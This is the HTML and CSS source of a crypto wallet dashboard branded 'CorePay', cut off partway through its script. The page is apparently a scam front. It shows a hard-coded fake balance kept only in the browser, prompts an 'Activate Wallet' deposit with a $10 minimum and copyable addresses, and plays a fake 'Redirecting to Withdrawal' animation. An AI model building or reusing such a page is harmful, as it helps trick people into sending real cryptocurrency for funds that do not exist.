<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>CorePay Dashboard</title>
<style>
body{margin:0;background:#0b0f14;font-family:system-ui;color:white;opacity:0;transition:.3s}
.header{background:#111827;padding:18px;display:flex;justify-content:space-between;align-items:center}
.logo{height:34px}
.grid{padding:18px;display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
.card{background:rgba(17,24,39,.85);border-radius:18px;padding:20px;backdrop-filter:blur(10px);box-shadow:0 0 30px rgba(0,0,0,.4);transition:.2s}
.card:hover{transform:translateY(-3px)}
.balance{font-size:28px;font-weight:700;margin-top:6px}
button{background:#22c55e;border:none;color:white;padding:12px 14px;border-radius:12px;cursor:pointer;margin-top:10px;font-weight:600;width:100%;transition:.3s}
select,input{width:100%;padding:12px;margin-top:10px;background:#0b0f14;border:1px solid #263041;border-radius:10px;color:white}
.feed{font-size:14px;line-height:1.6}
.tag{padding:3px 8px;border-radius:8px;font-size:12px}
.green{background:#065f46}
.yellow{background:#78350f}
.red{background:#7f1d1d}
.pop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);justify-content:center;align-items:center}
.box{background:#111827;padding:28px;border-radius:16px;width:340px;text-align:center}
.bar{height:8px;background:#1f2937;border-radius:8px;margin-top:15px}
.fill{height:100%;width:0;background:#22c55e}
.loadingOverlay{display:none;position:fixed;inset:0;background:#0b0f14;justify-content:center;align-items:center;z-index:9999;color:white;text-align:center;font-size:22px;}
.loadingDots{display:inline-block;margin-left:5px;}
.loadingDots span{animation:dot 1.4s infinite linear;display:inline-block;}
.loadingDots span:nth-child(1){animation-delay:0s;}
.loadingDots span:nth-child(2){animation-delay:.2s;}
.loadingDots span:nth-child(3){animation-delay:.4s;}
@keyframes dot{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
</style>
</head>
<body>
<div class="header">
<div style="display:flex;align-items:center;gap:10px">
<img src="logo.png" class="logo"><strong>CorePay</strong></div>
<div id="walletLabel"></div>
</div>

<div class="grid">
<div class="card">
<h3>Wallet Overview</h3>
<div class="balance" id="bal">0.000 BTC</div>
<div id="pending">Pending: 0</div>
<div id="crypto">Crypto: BTC</div>
<button onclick="activateWallet()">Activate Wallet</button>
<a href="#" onclick="redirectWithdrawal()"><button>Withdraw</button></a>
</div>

<div class="card">
<h3>Select Crypto</h3>
<select id="coin">
<option>BTC</option><option>SOL</option><option>TRX</option>
<option>USDT-TRC20</option><option>USDT-ERC20</option>
<option>BNB</option><option>ETH</option><option>XRP</option>
<option>ADA</option><option>DOGE</option><option>MATIC</option>
<option>LTC</option><option>AVAX</option><option>DOT</option>
</select>
</div>

<div class="card">
<h3>Activity</h3>
<div class="feed" id="feed"></div>
</div>
</div>

<div class="pop" id="depositPopup">
<div class="box">
<h3>Deposit to Wallet</h3>
<p>Minimum deposit: $10</p>
<select id="coinSelect" onchange="updateWalletAddress()">
<option>BTC</option><option>USDT-ERC20</option><option>USDT-TRC20</option><option>SOL</option><option>BNB</option>
</select>
<input type="number" id="amount" placeholder="Enter amount">
<div style="display:flex;gap:6px;margin-top:10px">
<input type="text" id="walletAddress" readonly placeholder="Wallet address will appear here">
<button onclick="copyWallet()">ðŸ“‹</button>
</div>
<button id="confirmDepositBtn" onclick="confirmDeposit()">Confirm Deposit</button>
<button onclick="closeDeposit()">Close</button>
<div id="depositLoading" class="bar"><div class="fill" id="depositFill"></div></div>
</div>
</div>

<!-- animated redirect overlay -->
<div class="loadingOverlay" id="loadingOverlay">
<h3>Redirecting to Withdrawal<span class="loadingDots"><span>.</span><span>.</span><span>.</span></span></h3>
</div>

<script>
document.addEventListener("DOMContentLoaded", ()=>{
const wallet = localStorage.wallet || "demo";
document.getElementById("walletLabel").innerText = wallet;
const key = "corepay_" + wallet;
let data = JSON.parse(localStorage.getItem(key)) || {balance:0.042, pending:[], history:[], coin:"BTC"};
function save(){ localStorage.setItem(key, JSON.stringify(data)); }

function render(){
document.getElementById("bal").innerText = data.balance.toFixed(3) + " " + (data.coin||"BTC");
document.getElementById("pending").innerText = "Pending: "+data.pending.length;
let feedEl = document.getElementById("feed"); feedEl.innerHTML="";
data.history.slice().reverse().forEach(i=>feedEl.innerHTML+=`<div>${i}</div>`);
}
render();

const wallets = {
